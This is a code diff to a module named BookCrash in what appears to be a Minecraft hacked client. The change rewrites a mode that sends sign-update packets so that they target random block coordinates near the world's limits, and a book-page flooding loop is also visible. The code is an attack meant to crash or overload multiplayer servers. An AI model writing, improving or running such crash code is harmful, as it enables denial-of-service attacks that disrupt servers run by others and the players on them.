@@ -38,6 +38,7 @@ import net.minecraft.server.network.packet.ClickWindowC2SPacket;
 import net.minecraft.server.network.packet.CreativeInventoryActionC2SPacket;
 import net.minecraft.server.network.packet.UpdateSignC2SPacket;
 import net.minecraft.text.Text;
+import net.minecraft.util.math.BlockPos;
 
 import java.util.Random;
 import java.util.stream.Collectors;
@@ -86,8 +87,11 @@ public class BookCrash extends Module {
         }
         
         if (getSettings().get(0).toMode().mode == 2) {
-        	Text text = Text.Serializer.fromJson("{\"text\":\"" + size + "\",\"color\":\"red\"}");
-        	mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(mc.player.getBlockPos(), text, text, text, text));
+        	//Text text = Text.Serializer.fromJson("{\"text\":\"" + size + "\",\"color\":\"red\"}");
+        	Text text = Text.Serializer.fromJson("{\"text\":\"pp\"}");
+        	Random rand = new Random();
+        	mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
+        			new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
         } else {
 	        for (int i = 0; i < pages; i++) {
 	            String siteContent = size;
